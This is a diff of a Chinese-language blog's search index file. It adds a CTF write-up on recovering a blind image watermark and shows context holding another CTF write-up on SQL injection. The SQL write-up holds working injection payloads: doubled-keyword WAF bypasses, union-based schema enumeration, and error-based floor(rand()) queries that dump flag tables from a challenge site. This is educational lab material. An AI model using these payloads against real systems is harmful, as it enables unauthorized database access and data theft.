@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[照片里的盲水印]]></title>
+    <url>%2F2018%2F09%2F02%2F%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0%2F</url>
+    <content type="text"><![CDATA[这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的赛事水平（赛棍？？？）但是这个方面还是要看一下，就当做开发脑力了。 题目：暴力可解题目文件下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是纯数字类型。获得密码，解压得到两张相同的图片。在misc中，两张相同的图片基本上都应该是盲水印，所以使用bwm脚本（python2）。bwm脚本的github运行脚本发现没有cv2这个模块，使用下面的命令安装cv2pip install opencv-python然后运行python bwm.py decode 1.png 2.png flag.png。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>MISC</tag>
+        <tag>盲水印</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SQL报错注入]]></title>
     <url>%2F2018%2F08%2F17%2FSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
     <content type="text"><![CDATA[快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。 这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。 题名：多次，网址链接 首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤?id=1’，页面发生变化，猜测位查询语句为单引号闭合。再次进行测试，?id=1′ or 1=1%23 ，发现并无变化。猜测可能有WAF过滤，于是测试双重写or，?id=1′ oorr 1=1%23 ，测试发现页面改变 进行测试过滤，使用异或符号（^）搭配length函数开始测试。 如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。经测试：or，and，union，select被过滤。那么接下来就是常规测试。 ?id=1%27 oorrder by 2%23，测试列数为2。（注意order里面的or） 爆数据库?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：information里面的or） 爆表?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23 爆出数据?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。 寻找下一关地址?id=-1%27 uniounionn selecselectt 1,address from flag1 %23 找到下一关地址OK，还是向上面的一样测试，发现还是单引号过滤。发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。因为还发现有报错产生，那么我就进行报错盲注测试。 盲注测试公式：union select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x; 其中version()改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。 or (select 1 from(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)a)%23 因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错Operand should contain 1 column(s) , 且(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。解决方法：left((select flag2 from flag2),40)，取前40个字符。 相关链接：https://blog.csdn.net/qq_35544379/article/details/77453019 https://blog.csdn.net/he_and/article/details/80455884 http://wyb0.com/ 两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。]]></content>
@@ -20,8 +32,8 @@
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>SQLinjection</tag>
         <tag>kali</tag>
+        <tag>SQLinjection</tag>
       </tags>
   </entry>
   <entry>
